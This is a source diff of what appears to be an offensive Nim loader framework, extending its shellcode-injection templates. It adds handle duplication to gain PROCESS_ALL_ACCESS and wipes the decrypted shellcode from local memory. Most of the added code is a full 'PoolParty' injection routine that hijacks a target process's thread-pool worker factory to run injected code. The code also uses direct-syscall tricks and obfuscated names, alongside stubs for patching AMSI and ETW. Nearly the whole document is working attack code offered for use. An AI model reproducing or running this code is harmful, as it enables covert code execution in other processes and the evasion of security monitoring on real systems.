@@ -11,10 +11,17 @@ let ShellcodeRemoteInjectMapSection * = """
 
         when defined(SysWhispers):
             when not defined(spawninject):
-                status = opqiwepoausdasdjl(&tProcess,PROCESS_ALL_ACCESS,&oa, &cid)
-
+                status = opqiwepoausdasdjl(&tProcess,PROCESS_QUERY_INFORMATION,&oa, &cid)
+                
                 when defined(verbose):
                     echo obf("[*] NtOpenProcess: "), toHex(status)
+                
+                var highPrivHandle: HANDLE
+                let workedfine = DuplicateHandle(-1, tProcess, -1, &highPrivHandle, PROCESS_ALL_ACCESS, FALSE, 0)
+                when defined(verbose):
+                    echo obf("[*] DuplicateHandle: "), workedfine
+                tProcess = highPrivHandle
+                
 
             when defined(AllocateDripStyle):
                 lpMapAddressRemote = DripAllocate(HANDLE(tProcess), cast[SIZE_T](friendlycode.len), friendlycode)
@@ -96,9 +103,22 @@ let ShellcodeRemoteInjectMapSection * = """
                         echo obf("[-] Failed to find opcode for NtOpenProcess")
             
             when not defined(spawninject): # We already got a Handle, no need to open it again. Only for existing processes.
-                status = NtOpenProcess(&tProcess,PROCESS_ALL_ACCESS,&oa, &cid)
+                status = NtOpenProcess(&tProcess,PROCESS_QUERY_INFORMATION,&oa, &cid)
                 when defined(verbose):
                     echo obf("[*] NtOpenProcess: "), toHex(status)
+                
+                # duplicate handle to PROCESS_ALL_ACCESS
+                when defined(Hellsgate):
+                    if getSyscall(ntDuplicateTable):
+                        syscall = ntDuplicateTable.wSysCall
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to find opcode for NtDuplicateObject")
+                var highPrivHandle: HANDLE
+                status = NtDuplicateObject(-1, tProcess, -1, &highPrivHandle, PROCESS_ALL_ACCESS, FALSE, 0)
+                when defined(verbose):
+                    echo obf("[*] NtDuplicateObject: "), status
+                tProcess = highPrivHandle
         
 
             when defined(AllocateDripStyle):
@@ -191,6 +211,10 @@ let ShellcodeRemoteInjectMapSection * = """
                     when defined(verbose):
                         echo obf("[-] Failed to find opcode for NtCreateThreadEx")
             
+            when defined(poolparty):
+                ExecutePoolparty(tProcess, lpMapAddressRemote)
+                return
+
             when defined(QueueAPC):
                 when defined(Hellsgate):
                     if getSyscall(ntQueueApcThreadTable):
@@ -244,10 +268,17 @@ let ShellcoderemoteinjectStub * = """
         
         when defined(SysWhispers):
             when not defined(spawninject):
-                status = opqiwepoausdasdjl(&tProcess,PROCESS_ALL_ACCESS,&oa, &cid)
+                status = opqiwepoausdasdjl(&tProcess,PROCESS_QUERY_INFORMATION,&oa, &cid)
 
                 when defined(verbose):
                     echo obf("[*] NtOpenProcess: "), toHex(status)
+                
+                # duplicate handle to PROCESS_ALL_ACCESS
+                var highPrivHandle: HANDLE
+                let workedfine = DuplicateHandle(-1, tProcess, -1, &highPrivHandle, PROCESS_ALL_ACCESS, FALSE, 0)
+                when defined(verbose):
+                    echo obf("[*] DuplicateHandle: "), workedfine
+                tProcess = highPrivHandle
             
 
             when defined(AllocateDripStyle):
@@ -280,6 +311,14 @@ let ShellcoderemoteinjectStub * = """
                     echo obf("[*] NtWriteProcessMemory: "), toHex(status)
                     echo obf("    \\-- bytes written: "), bytesWritten
                     echo obf("")
+                
+                when defined(verbose):
+                    echo obf("[*] Going to clean local memory of decrypted shellcode")
+                # ptrDecText has to be overwritten with 0 for friendlycode.len bytes
+                var zeroSeq: seq[byte] = newSeq[byte](friendlycode.len)
+                moveMemory(ptrDecText, addr zeroSeq[0], friendlycode.len)
+                when defined(verbose):
+                    echo obf("[*] Done.")
             
             when defined(JmpEntry):
                 var newEntry: LPVOID
@@ -336,9 +375,22 @@ let ShellcoderemoteinjectStub * = """
                         echo obf("[-] Failed to find opcode for NtOpenProcess")
         
             when not defined(spawninject):
-                status = NtOpenProcess(&tProcess,PROCESS_ALL_ACCESS,&oa, &cid)
+                status = NtOpenProcess(&tProcess,PROCESS_QUERY_INFORMATION,&oa, &cid)
                 when defined(verbose):
                     echo obf("[*] NtOpenProcess: "), status
+                
+                # duplicate handle to PROCESS_ALL_ACCESS
+                when defined(Hellsgate):
+                    if getSyscall(ntDuplicateTable):
+                        syscall = ntDuplicateTable.wSysCall
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to find opcode for NtDuplicateObject")
+                var highPrivHandle: HANDLE
+                status = NtDuplicateObject(-1, tProcess, -1, &highPrivHandle, PROCESS_ALL_ACCESS, FALSE, 0)
+                when defined(verbose):
+                    echo obf("[*] NtDuplicateObject: "), toHex(status)
+                tProcess = highPrivHandle
         
             when defined(Hellsgate):
                 if getSyscall(ntAllocTable):
@@ -495,6 +547,15 @@ let ShellcoderemoteinjectStub * = """
                     echo obf("    \\-- bytes written: "), bytesWritten
                     echo obf("")
                 
+                when defined(verbose):
+                    echo obf("[*] Going to clean local memory of decrypted shellcode")
+                # ptrDecText has to be overwritten with 0 for friendlycode.len bytes
+                var zeroSeq: seq[byte] = newSeq[byte](friendlycode.len)
+                moveMemory(ptrDecText, addr zeroSeq[0], friendlycode.len)
+                when defined(verbose):
+                    echo obf("[*] Done.")
+
+
                 when defined(logFile):
                     logVerbose(obf("[*] NtWriteVirtualMemory: ") & cast[string](toHex(status)) & "\r\n")
                     logVerbose(obf("    \\-- bytes written: ") & cast[string](bytesWritten) & "\r\n")
@@ -859,6 +920,21 @@ let ShellcoderemoteinjectStub * = """
                     restoreText()
                 quit(0)
 
+            when defined(poolparty):
+                when defined(JmpEntry):
+                    ds = newEntry
+                ExecutePoolparty(tProcess, ds)
+                when defined(JmpEntry):
+                    Sleep(1000)
+                    if(restoreBytes(tProcess, ds)):
+                        when defined(verbose):
+                            echo obf("[*] Restored bytes!")
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to restore bytes!")
+                when defined(restore):
+                    restoreText()
+                return
 
             when defined(QueueAPC):
                 when defined(Hellsgate):
@@ -1155,11 +1231,33 @@ let RemotePatchAMSIStub* = """
                 cid2.UniqueProcess = processID
                 var statusamsi = NtOpenProcess(
                     &hProcss,
-                    PROCESS_ALL_ACCESS, 
+                    PROCESS_QUERY_INFORMATION, 
                     &oa2, &cid2         
                 )
                 when defined(verbose):
                     echo obf("[*] NtOpenProcess: "), toHex(statusamsi)
+                
+                when defined(Hellsgate):
+                    if getSyscall(ntDuplicateTable):
+                        syscall = ntDuplicateTable.wSysCall
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to find opcode for NtDuplicateObject")
+
+                # duplicate to get PROCESS_ALL_ACCESS
+                var high: HANDLE
+                status = NtDuplicateObject(
+                    -1, 
+                    hProcss, 
+                    -1, 
+                    &high, 
+                    PROCESS_ALL_ACCESS, 
+                    FALSE, 
+                    0
+                )
+                when defined(verbose):
+                    echo obf("[*] NtDuplicateObject: "), toHex(workedfine)
+                hProcss = high
         
         when not defined(spawninject):
             var procHandle2: HANDLE = hProcss
@@ -1461,10 +1559,26 @@ let RemoteLoadAMSIStub* = """
 
         when defined(SysWhispers):
             when not defined(spawninject):
-                status = opqiwepoausdasdjl(&tProcess,PROCESS_ALL_ACCESS,&oa, &cid)
+                status = opqiwepoausdasdjl(&tProcess,PROCESS_QUERY_INFORMATION,&oa, &cid)
 
                 when defined(verbose):
                     echo obf("[*] NtOpenProcess: "), toHex(status)
+                
+                # duplicate to get PROCESS_ALL_ACCESS
+                var high: HANDLE
+                let workedfine = DuplicateHandle(
+                    -1, 
+                    tProcess, 
+                    -1, 
+                    &high, 
+                    PROCESS_ALL_ACCESS, 
+                    FALSE, 
+                    0
+                )
+                when defined(verbose):
+                    echo obf("[*] DuplicateHandle: "), toHex(workedfine)
+                tProcess = high
+
 
             status = oqiahsjynmxkla(tProcess, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
             when defined(verbose):
@@ -1495,9 +1609,31 @@ let RemoteLoadAMSIStub* = """
                         echo obf("[-] Failed to find opcode for NtOpenProcess")
 
             when not defined(spawninject):
-                status = NtOpenProcess(&tProcess,PROCESS_ALL_ACCESS,&oa, &cid)
+                status = NtOpenProcess(&tProcess,PROCESS_QUERY_INFORMATION,&oa, &cid)
                 when defined(verbose):
                     echo obf("[*] NtOpenProcess: "), toHex(status)
+                
+                # duplicate to get PROCESS_ALL_ACCESS
+                when defined(Hellsgate):
+                    if getSyscall(ntDuplicateTable):
+                        syscall = ntDuplicateTable.wSysCall
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to find opcode for NtDuplicateObject")
+                var high: HANDLE
+                status = NtDuplicateObject(
+                    -1, 
+                    tProcess, 
+                    -1, 
+                    &high, 
+                    PROCESS_ALL_ACCESS, 
+                    FALSE, 
+                    0
+                )
+                when defined(verbose):
+                    echo obf("[*] NtDuplicateObject: "), toHex(status)
+                tProcess = high
+
 
             when defined(Hellsgate):
                 if getSyscall(ntAllocTable):
@@ -1533,6 +1669,14 @@ let RemoteLoadAMSIStub* = """
             when defined(verbose):
                 echo obf("    \\-- bytes written: "), bytesWritten
                 echo obf("")
+            
+            when defined(verbose):
+                echo obf("[*] Going to clean local memory of decrypted shellcode")
+            # ptrDecText has to be overwritten with 0 for friendlycode.len bytes
+            var zeroSeq: seq[byte] = newSeq[byte](friendlycode.len)
+            moveMemory(ptrDecText, addr zeroSeq[0], friendlycode.len)
+            when defined(verbose):
+                echo obf("[*] Done.")
             
             when defined(Hellsgate):
                 if getSyscall(ntProtectTable):
@@ -1715,12 +1859,18 @@ let RemotePatchETWStub* = """
         var cid: CLIENT_ID
         when not defined(spawninject):
             var hProcssetw: HANDLE
+            var hProcHighPriv: HANDLE
         var status: NTSTATUS
         cid.UniqueProcess = remoteProcID
         var oa: OBJECT_ATTRIBUTES
         when defined(SysWhispers):
             when not defined(spawninject):
-                status = opqiwepoausdasdjl(&hProcss,PROCESS_ALL_ACCESS,&oa, &cid)
+                status = opqiwepoausdasdjl(&hProcss,PROCESS_QUERY_INFORMATION,&oa, &cid)
+
+                # now use DuplicateHandle to elevate this to PROCESS_ALL_ACCESS
+                DuplicateHandle(-1, hProcss, -1, &hProcHighPriv, PROCESS_ALL_ACCESS, FALSE, 0)
+                when defined(verbose):
+                    echo obf("[*] DuplicateHandle: "), toHex(status)
         else:
             when defined(Hellsgate):
                 if getSyscall(ntOpenTable):
@@ -1732,16 +1882,27 @@ let RemotePatchETWStub* = """
             when not defined(spawninject):
                 status = NtOpenProcess(
                     &hProcssetw,
-                    PROCESS_ALL_ACCESS, 
+                    PROCESS_QUERY_INFORMATION, 
                     &oa, &cid         
                 )
                 when defined(verbose):
                     echo obf("[*] NtOpenProcess: "), toHex(status)
+                
+                # now use DuplicateHandle to elevate this to PROCESS_ALL_ACCESS
+                when defined(Hellsgate):
+                    if getSyscall(ntDuplicateTable):
+                        syscall = ntDuplicateTable.wSysCall
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to find opcode for NtDuplicateObject")
+                status = NtDuplicateObject(-1, hProcssetw, -1, &hProcHighPriv, PROCESS_ALL_ACCESS, FALSE, 0)
+                when defined(verbose):
+                    echo obf("[*] NtDuplicateObject: "), toHex(status)
         
         when not defined(spawninject):
-            var procHandle: HANDLE = hProcssetw
+            var procHandle: HANDLE = hProcHighPriv
         else:
-            var procHandle: HANDLE = tProcess
+            var procHandle: HANDLE = hProcHighPriv
 
         success = RemotePatchETW(procHandle)
         
@@ -1830,6 +1991,14 @@ let RemoteForceSleepStub* = """
                 echo obf("    \\-- bytes written: "), bytesWritten
                 echo obf("")
             
+            when defined(verbose):
+                echo obf("[*] Going to clean local memory of decrypted shellcode")
+            # ptrDecText has to be overwritten with 0 for friendlycode.len bytes
+            var zeroSeq: seq[byte] = newSeq[byte](friendlycode.len)
+            moveMemory(ptrDecText, addr zeroSeq[0], friendlycode.len)
+            when defined(verbose):
+                echo obf("[*] Done.")
+
             when defined(Hellsgate):
                 if getSyscall(ntProtectTable):
                     syscall = ntProtectTable.wSysCall
@@ -1877,5 +2046,1111 @@ let RemoteForceSleepStub* = """
             else:
                 return 0
             
+
+"""
+
+let PoolpartyExecute* = """
+
+    proc ExecutePoolparty(pHandle: HANDLE,startPointer: LPVOID) =
+
+
+        proc NtQueryObjectWrap(x: HANDLE, y: OBJECT_INFORMATION_CLASS): ptr BYTE =
+            var InformationLength: ULONG = 0
+            var Ntstatus: NTSTATUS = STATUS_INFO_LENGTH_MISMATCH
+            # Information is a byte sequence with the length of y
+            var oinfoBuffer = VirtualAlloc(NULL, sizeof(OBJECT_TYPE_INFORMATION), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
+            Ntstatus = NtQueryObject(x, y, oinfoBuffer, InformationLength, addr InformationLength)
+            if (Ntstatus == 0):
+                #echo obf("[+] NtQueryObject success")
+                Sleep(100)
+                return cast[ptr BYTE](oinfoBuffer)
+            while Ntstatus == STATUS_INFO_LENGTH_MISMATCH:
+                #Information = cast[PBYTE](MSVCRT$realloc(Information, InformationLength))
+                #echo "NTQuery Length mismatch"
+                VirtualFree(oinfoBuffer, 0, MEM_RELEASE)
+                oinfoBuffer = VirtualAlloc(NULL, InformationLength, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
+                #Information = cast[ptr BYTE](realloc(Information, InformationLength))
+                #var Information2: seq[byte] = newSeq[byte](InformationLength)
+                #echo "REalloc done"
+                Ntstatus = NtQueryObject(x, y, oinfoBuffer, InformationLength, addr InformationLength)
+                #echo "status: ", toHex(Ntstatus)
+                if(Ntstatus == 0):
+                    Sleep(100)
+
+            return cast[ptr BYTE](oinfoBuffer)
+
+        proc HijackProcessHandle(wsObjectType: PWSTR, p_hTarget: HANDLE, dwDesiredAccess: DWORD): HANDLE =
+            var Information: PBYTE = nil
+            var lhInfo: PROCESS_HANDLE_SNAPSHOT_INFORMATION
+            var phInfo: PPROCESS_HANDLE_SNAPSHOT_INFORMATION = addr lhInfo
+            var QueryBuffer = VirtualAlloc(NULL, sizeof(PROCESS_HANDLE_SNAPSHOT_INFORMATION), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
+            var size: ULONG = cast[ULONG](sizeof(PROCESS_HANDLE_SNAPSHOT_INFORMATION))
+            var InformationLength: ULONG = 0
+            var Ntstatus: NTSTATUS = STATUS_INFO_LENGTH_MISMATCH
+            Sleep(100)
+            Ntstatus = NtQueryInformationProcess(p_hTarget, PROCESS_INFORMATION_CLASS(ProcessHandleInformation), QueryBuffer, size, addr InformationLength)
+            # if fail, retry with new InformationLength
+            var test: int = 0
+            while (Ntstatus == STATUS_INFO_LENGTH_MISMATCH):
+                Sleep(100)
+                VirtualFree(QueryBuffer, 0, MEM_RELEASE)
+                QueryBuffer = VirtualAlloc(NULL, cast[SIZE_T](InformationLength), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
+                size = InformationLength
+                #var lhInfo2: PROCESS_HANDLE_SNAPSHOT_INFORMATION
+                #var phInfo2: PPROCESS_HANDLE_SNAPSHOT_INFORMATION = addr lhInfo2
+                #Information = cast[PBYTE](realloc(Information, InformationLength))
+                #var InformationLength2: ULONG = 0
+                Ntstatus = NtQueryInformationProcess(p_hTarget, PROCESS_INFORMATION_CLASS(ProcessHandleInformation), QueryBuffer, size, addr InformationLength)
+                if Ntstatus == 0:
+                    phInfo = cast[PPROCESS_HANDLE_SNAPSHOT_INFORMATION](QueryBuffer)
+                test += 1
+                if test > 10:
+                    break
+            
+            if Ntstatus != 0:
+                when defined(verbose):
+                    echo obf("[-] Still Failed")
+                    echo toHex(Ntstatus)
+                return 0
+            
+            var pProcessHandleInformation: PPROCESS_HANDLE_SNAPSHOT_INFORMATION = cast[PPROCESS_HANDLE_SNAPSHOT_INFORMATION](phInfo)
+            var p_hDuplicatedObject: HANDLE
+            
+            Sleep(100)
+            for i in 0 ..< pProcessHandleInformation.NumberOfHandles:
+                
+                var uncheckedArray: ptr UncheckedArray[PROCESS_HANDLE_TABLE_ENTRY_INFO] = cast[ptr UncheckedArray[PROCESS_HANDLE_TABLE_ENTRY_INFO]](addr pProcessHandleInformation.Handles[0])
+                # use it via uncheckedArray[i].HandleValue
+
+                var success: BOOL = DuplicateHandle(
+                    p_hTarget,
+                    cast[HANDLE](uncheckedArray[i].HandleValue),#pProcessHandleInformation.Handles[i].HandleValue), #tableEntrynoPointer.HandleValue#),
+                    GetCurrentProcess(), 
+                    addr p_hDuplicatedObject,
+                    dwDesiredAccess,
+                    FALSE,
+                    0)
+                
+                    
+                
+                var pObjectInformation: ptr BYTE = nil
+                Sleep(100)
+                
+                if (p_hDuplicatedObject != 0):
+                    pObjectInformation = NtQueryObjectWrap(p_hDuplicatedObject, cast[OBJECT_INFORMATION_CLASS](2))
+                
+                var pObjectTypeInformation: PPUBLIC_OBJECT_TYPE_INFORMATION = cast[PPUBLIC_OBJECT_TYPE_INFORMATION](pObjectInformation)
+                
+                # if wsObjectType != pObjectTypeInformation.TypeName.Buffer: continue
+                #echo "First: ", wsObjectType
+                if pObjectTypeInformation == nil:
+                    continue
+                if pObjectTypeInformation.TypeName.Buffer == nil:
+                    continue
+                #echo "Second: ", pObjectTypeInformation.TypeName.Buffer
+                if(wcscmp(wsObjectType,pObjectTypeInformation.TypeName.Buffer) != 0):
+                    continue
+                when defined(verbose):
+                    echo obf("[+] Found Hijack Handle")
+                
+
+                return p_hDuplicatedObject
+
+            return 0
+
+
+        proc GetWorkerFactoryBasicInformation(hWorkerFactory: HANDLE): WORKER_FACTORY_BASIC_INFORMATION =
+            var WorkerInput2 #[QUERY_WORKERFACTORYINFOCLASS WorkerFactoryBasicInformation2]# : QUERY_WORKERFACTORYINFOCLASS = QUERY_WORKERFACTORYINFOCLASS.WorkerFactoryBasicInformation2
+            var WorkerFactoryInformation: WORKER_FACTORY_BASIC_INFORMATION
+            var status: NTSTATUS
+            status = NtQueryInformationWorkerFactory(hWorkerFactory, WorkerInput2, addr WorkerFactoryInformation, ULONG(sizeof(WorkerFactoryInformation)), nil)
+            return WorkerFactoryInformation
+
+        # HijackWorkerFactoryProcessHandle is equal to HijackProcessHandle with wsObjectType = "TpWorkerFactory"
+
+        proc SetupExecution(p_hWorkerFactory: HANDLE) =
+            
+            when defined(Hellsgate):
+                if getSyscall(ntSetInformationWorkerFactoryTable):
+                    syscall = ntSetInformationWorkerFactoryTable.wSysCall
+                else:
+                    when defined(verbose):
+                        echo obf("[-] Failed to find opcode for NtSetInformationWorkerFactory")
+            
+            var WorkerFactoryMinimumThreadNumber: ULONG = 4
+            var WorkerFactoryInformationClass: SET_WORKERFACTORYINFOCLASS = SET_WORKERFACTORYINFOCLASS.WorkerFactoryThreadMinimum
+            var WorkerFactoryInformationLength: ULONG = ULONG(sizeof(ULONG))
+            var status: NTSTATUS
+            when defined(verbose):
+                echo obf("[+] Starting new worker and therefore leads to execution")
+            status = NtSetInformationWorkerFactory(p_hWorkerFactory, WorkerFactoryInformationClass, addr WorkerFactoryMinimumThreadNumber, WorkerFactoryInformationLength)
+            if (status != 0):
+                when defined(verbose):
+                    echo obf("[-] Failed to set target process worker factory minimum threads")
+                quit(1)
+            else:
+                when defined(verbose):
+                    echo obf("[+] Set target process worker factory minimum threads to: "), WorkerFactoryMinimumThreadNumber
+
+        proc HijackHandles(p_hWorkerFactory: HANDLE) =
+            var WorkerFactoryInformation: WORKER_FACTORY_BASIC_INFORMATION
+            WorkerFactoryInformation = GetWorkerFactoryBasicInformation(p_hWorkerFactory)
+        
+
+        when defined(variant1):
+            
+            var trampoline: seq[byte]
+            if defined(amd64):
+                trampoline = @[
+                    byte(0x49), byte(0xBA), byte(0x00), byte(0x00), byte(0x00), byte(0x00), byte(0x00), byte(0x00), # mov r10, addr
+                    byte(0x00),byte(0x00),byte(0x41), byte(0xFF),byte(0xE2)                                         # jmp r10
+                ]
+                var tempjumpaddr: uint64 = cast[uint64](startPointer)
+                copyMem(&trampoline[2] , &tempjumpaddr, 6)
+            elif defined(i386):
+                trampoline = @[
+                    byte(0xB8), byte(0x00), byte(0x00), byte(0x00), byte(0x00), # mov eax, addr
+                    byte(0x00),byte(0x00),byte(0xFF), byte(0xE0)                                      # jmp eax
+                ]
+                var tempjumpaddr: uint32 = cast[uint32](startPointer)
+                copyMem(&trampoline[1] , &tempjumpaddr, 3)
+            
+            # Hijack target Worker Factory
+            #echo "Start hijack"
+            var p_hWorkerFactory: HANDLE = HijackProcessHandle("TpWorkerFactory", pHandle, WORKER_FACTORY_ALL_ACCESS)
+            if(p_hWorkerFactory == 0):
+                when defined(verbose):
+                    echo obf("[-] Failed to hijack the target process worker factory")
+                quit(1)
+            else:
+                when defined(verbose):
+                    echo obf("[+] Hijacked the target process worker factory")
+
+
+            # Get Worker Factory Information via NtQueryInformationWorkerFactory
+
+            var workerFactoryInformation: WORKER_FACTORY_BASIC_INFORMATION = GetWorkerFactoryBasicInformation(p_hWorkerFactory)
+            when defined(verbose):
+                echo obf("[+] Got Worker Factory Information.")
+            # Get start routine
+            var startRoutine: LPVOID = workerFactoryInformation.StartRoutine
+            when defined(verbose):
+                echo obf("[+] Got start routine")
+            when defined(Hellsgate):
+                if getSyscall(ntProtectTable):
+                    syscall = ntProtectTable.wSysCall
+                else:
+                    when defined(verbose):
+                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+            
+            var sc_size: SIZE_T = cast[SIZE_T](trampoline.len)
+            var oldProtect: DWORD
+            var targetAddress: LPVOID = startRoutine
+            var status: NTSTATUS
+            
+            status = NtProtectVirtualMemory(
+                pHandle, 
+                addr targetAddress, 
+                &sc_size, 
+                PAGE_READWRITE, 
+                addr oldProtect)
+            
+            when defined(verbose):
+                echo obf("[*] NtProtectVirtualMemory: "), toHex(status)
+                echo obf("    \\-- old protection: "), toHex(oldProtect)
+                echo obf("")
+
+            when defined(Hellsgate):
+                if getSyscall(ntWriteTable):
+                    syscall = ntWriteTable.wSysCall
+                else:
+                    when defined(verbose):
+                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+            var bytesWritten: SIZE_T = 0
+            status = NtWriteVirtualMemory(
+                pHandle, 
+                startRoutine, 
+                addr trampoline[0], 
+                trampoline.len, 
+                addr bytesWritten)
+
+            when defined(verbose):
+                echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
+                echo obf("    \\-- bytes written: "), bytesWritten
+                echo obf("")
+            
+            when defined(Hellsgate):
+                if getSyscall(ntProtectTable):
+                    syscall = ntProtectTable.wSysCall
+                else:
+                    when defined(verbose):
+                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+            
+            targetAddress = startRoutine
+            var oldProtect2: DWORD
+            sc_size = cast[SIZE_T](trampoline.len)
+            status = NtProtectVirtualMemory(
+                pHandle, 
+                addr targetAddress, 
+                &sc_size, 
+                oldprotect, 
+                addr oldProtect2)
+            
+            when defined(verbose):
+                echo obf("[*] NtProtectVirtualMemory: "), toHex(status)
+                echo obf("    \\-- old protection: "), toHex(oldProtect2)
+                echo obf("")
+
+
+            
+            if(status == 0):
+                when defined(verbose):
+                    echo obf("[+] Successfully wrote Trampolin into start routine")
+            else:
+                when defined(verbose):
+                    echo obf("[-] Failed to write Trampolin into start routine")
+                    echo toHex(status)
+                quit(1)
+            #[
+            var bytesWritten: SIZE_T = 0
+            var success: BOOL = WriteProcessMemory(
+                pHandle,
+                startRoutine,
+                addr trampoline[0],
+                trampoline.len,
+                addr bytesWritten
+            )
+            if(success == 0):
+                when defined(verbose):
+                    echo obf("[-] Failed to write Trampolin into start routine")
+                    echo GetLastError()
+                quit(1)
+            else:
+                when defined(verbose):
+                    echo obf("[+] Successfully wrote Trampolin into start routine")
+            ]#
+            # Setup execution
+            SetupExecution(p_hWorkerFactory)
+
+        when defined(variant2):
+            # Hijack target Worker Factory
+            var p_hWorkerFactory: HANDLE = HijackProcessHandle("TpWorkerFactory", pHandle, WORKER_FACTORY_ALL_ACCESS)
+            if(p_hWorkerFactory == 0):
+                when defined(verbose):
+                    echo obf("[-] Failed to hijack the target process worker factory")
+                quit(1)
+            else:
+                when defined(verbose):
+                    echo obf("[+] Hijacked the target process worker factory")
+            # Get Worker Factory Information via NtQueryInformationWorkerFactory
+            var workerFactoryInformation: WORKER_FACTORY_BASIC_INFORMATION = GetWorkerFactoryBasicInformation(p_hWorkerFactory)
+            when defined(verbose):
+                echo obf("[+] Got Worker Factory Information.")
+
+            
+            var targetTaskQueueHighPriorityList: LPVOID = cast[LPVOID](cast[uint64](workerFactoryInformation.StartParameter) + cast[uint64](0x1E0))
+
+            
+            var pTpWork: LPVOID = cast[LPVOID](CreateThreadpoolWork(cast[PTP_WORK_CALLBACK](startPointer), nil, nil))
+            
+            let ExchangeValue: int32 = 0x2
+            var ExchangeLPVOID: LPVOID = unsafeAddr ExchangeValue
+            copyMem(cast[LPVOID](pTpWork + 0x90), cast[LPVOID](addr workerFactoryInformation.StartParameter), 8)
+            copyMem(cast[LPVOID](pTpWork + 0xD8), cast[LPVOID](addr targetTaskQueueHighPriorityList), 8)
+            copyMem(cast[LPVOID](pTpWork + 0xE0), cast[LPVOID](addr targetTaskQueueHighPriorityList), 8)
+            copyMem(cast[LPVOID](pTpWork + 0xE8),ExchangeLPVOID, 8)
+
+            when defined(verbose):
+                echo obf("[+] Modified the TP_WORK structure to be associated with target process's TP_POOL")
+            #var pRemoteTpWork: LPVOID
+            #pRemoteTpWork = cast[LPVOID](VirtualAllocEx(pHandle, nil, 240#[SizeOf FullTpWork]#, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE))
+            # use NtAllocateVirtualMemory instead
+            when defined(Hellsgate):
+                if getSyscall(ntAllocTable):
+                    syscall = ntAllocTable.wSysCall
+                else:
+                    when defined(verbose):
+                        echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")
+            var pRemoteTpWork: LPVOID = nil
+            var size: SIZE_T = cast[SIZE_T](240)#[SizeOf FullTpWork]#
+            var status: NTSTATUS = NtAllocateVirtualMemory(pHandle, addr pRemoteTpWork, 0, addr size, MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE)
+            if(status != 0):
+                when defined(verbose):
+                    echo obf("[-] Failed to allocate memory in the target process for the specially crafted TP_WORK structure")
+                quit(1)
+            else:
+                when defined(verbose):
+                    echo obf("[+] Allocated memory in the target process for the specially crafted TP_WORK structure")
+
+
+            #var bytWritten: SIZE_T = 0
+            #success = WriteProcessMemory(pHandle, pRemoteTpWork, pTpWork, sizeof(FULL_TP_WORK), addr bytWritten)
+            #if(success == 0):
+            #    quit(1)
+            # Use the same combination as above with NtProtect NtWrite NtProtect instead of WriteProcessMemory
+           
+            var targetAddress: LPVOID = pRemoteTpWork
+            var oldProtect: DWORD
+            var sc_size: SIZE_T = 240#[SizeOf FullTpWork]#
+
+            when defined(Hellsgate):
+                if getSyscall(ntWriteTable):
+                    syscall = ntWriteTable.wSysCall
+                else:
+                    when defined(verbose):
+                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+            var bytesWritten: SIZE_T = 0
+            status = NtWriteVirtualMemory(
+                pHandle, 
+                pRemoteTpWork, 
+                pTpWork, 
+                240#[SizeOf FullTpWork]#, 
+                addr bytesWritten)
+
+            when defined(verbose):
+                echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
+                echo obf("    \\-- bytes written: "), bytesWritten
+                echo obf("")
+
+            var RemoteWorkItemTaskList: LPVOID = (cast[LPVOID](pRemoteTpWork) + 0xD8)
+            
+            #targetAddress = cast[LPVOID](cast[LPVOID](workerFactoryInformation.StartParameter) + 0x1E0)
+            #success = WriteProcessMemory(pHandle,targetAddress,addr RemoteWorkItemTaskList, sizeof(RemoteWorkItemTaskList), addr bytWritten)
+            #if(success == 0):
+            #    when defined(verbose):
+            #        echo obf("[-] Queue Entry one overwrite failed")
+            #        echo GetLastError()
+            #    quit(1)
+            
+            # same one more time
+            when defined(Hellsgate):
+                if getSyscall(ntProtectTable):
+                    syscall = ntProtectTable.wSysCall
+                else:
+                    when defined(verbose):
+                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+            targetAddress = cast[LPVOID](cast[LPVOID](workerFactoryInformation.StartParameter) + 0x1E0)
+            var oldProtect3: DWORD
+            sc_size = cast[SIZE_T](8)
+            var protectAddress: LPVOID = targetAddress
+            status = NtProtectVirtualMemory(
+                pHandle, 
+                addr protectAddress, 
+                &sc_size, 
+                PAGE_READWRITE, 
+                addr oldProtect3)
+            
+            when defined(verbose):
+                echo obf("[*] NtProtectVirtualMemory: "), toHex(status)
+                echo obf("    \\-- old protection: "), toHex(oldProtect3)
+                echo obf("")
+
+            when defined(Hellsgate):
+                if getSyscall(ntWriteTable):
+                    syscall = ntWriteTable.wSysCall
+                else:
+                    when defined(verbose):
+                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
+
+            status = NtWriteVirtualMemory(
+                pHandle, 
+                targetAddress, 
+                addr RemoteWorkItemTaskList, 
+                8, 
+                addr bytesWritten)
+
+            when defined(verbose):
+                echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
+                echo obf("    \\-- bytes written: "), bytesWritten
+                echo obf("")
+            
+            when defined(Hellsgate):
+                if getSyscall(ntProtectTable):
+                    syscall = ntProtectTable.wSysCall
+                else:
+                    when defined(verbose):
+                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
+            
+            targetAddress = cast[LPVOID](cast[LPVOID](workerFactoryInformation.StartParameter) + 0x1E0)
+            var oldProtect4: DWORD
+            protectAddress = targetAddress
+            sc_size = cast[SIZE_T](8)
+            status = NtProtectVirtualMemory(
+                pHandle, 
+                addr protectAddress, 
+                &sc_size, 
+                oldProtect3, 
+                addr oldProtect4)
+            
+            when defined(verbose):
+                echo obf("[*] NtProtectVirtualMemory: "), toHex(status)
+                echo obf("    \\-- old protection: "), toHex(oldProtect4)
+                echo obf("")
+            
